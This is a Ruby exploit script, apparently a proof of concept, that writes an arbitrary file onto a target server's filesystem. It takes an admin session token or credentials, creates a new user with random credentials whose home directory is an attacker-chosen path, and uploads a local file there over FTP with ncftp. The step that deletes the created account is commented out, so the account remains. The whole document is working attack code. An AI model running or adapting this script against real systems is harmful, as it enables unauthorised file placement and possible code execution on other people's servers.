require './librhea.rb'

if ARGV.length < 4
  $stderr.puts 'Usage:'
  $stderr.puts
  $stderr.puts "ruby rhea-write-arbitrary-file.rb <target ip> <local file path> <remote file path> [session_token]|[username password]"
  $stderr.puts
  $stderr.puts "You must either specify a session_token, which must be authorized, or a username/password for an admin user"
  exit 1
end

# Set things up
TARGET = ARGV[0]
LOCAL_FILE  = ARGV[1]

REMOTE_FILENAME = '' + ARGV[2]

# Handle Windows paths by changing the '\'s to '/'s and back
if REMOTE_FILENAME.include?('\\') || REMOTE_FILENAME.start_with?('c:')
  REMOTE_FILENAME.gsub!(/\\/, '/')
  REMOTE_PATH, REMOTE_FILE = File.split(REMOTE_FILENAME)
  REMOTE_PATH.gsub!(/\//, '\\')
else
  REMOTE_PATH, REMOTE_FILE = File.split(REMOTE_FILENAME)
end

BASE_URL = "https://#{ARGV[0]}:41443"
puts "Establishing a session on #{BASE_URL}..."
if ARGV.length == 4
  $stderr.puts "Authenticating with session token: #{ARGV[3]}"
  RHEA = LibRhea::new(BASE_URL, token: ARGV[3])
else
  $stderr.puts "Authenticating with username/password: #{ARGV[3]} / #{ARGV[4]}"
  RHEA = LibRhea::new(BASE_URL, username: ARGV[3], password: ARGV[4])
end


# Generate random creds
NEW_USERNAME = (0...16).map { (0x61 + rand(26)).chr }.join
NEW_PASSWORD = (0...16).map { (0x61 + rand(26)).chr }.join

# Create a new user with those creds
puts
puts "Creating a user (username = #{NEW_USERNAME}, password = #{NEW_PASSWORD}, home_dir = #{REMOTE_PATH})..."
NEW_UUID = RHEA.create_user(
  username: NEW_USERNAME,
  password: NEW_PASSWORD,
  home_dir: REMOTE_PATH,
)
puts
puts "User created with uuid = #{NEW_UUID})"

# This uses the ncftp CLI to upload a file. That's not the _best_ way, but it
# works
puts "Uploading #{LOCAL_FILE} to #{REMOTE_PATH}/#{REMOTE_FILE}"
out = `echo 'put -z #{LOCAL_FILE} #{REMOTE_FILE}' | ncftp -u '#{NEW_USERNAME}' -p '#{NEW_PASSWORD}' '#{TARGET}' 2>/dev/null`

if out =~ /Requested action not taken/im
  $stderr.puts
  $stderr.puts "!! Something went wrong uploading the file! This usually happens because you can't use the same home directory twice without restarting the server process"
elsif out =~ /was not accepted/im
  $stderr.puts
  $stderr.puts "!! Something went wrong uploading the file! The FTP username/password didn't work, which means the user didn't get created"
else
  puts
  puts "File likely uploaded! Deleting the new user..."
end

# RHEA.delete_user(
#   username: NEW_USERNAME,
#   uuid: NEW_UUID,
# )
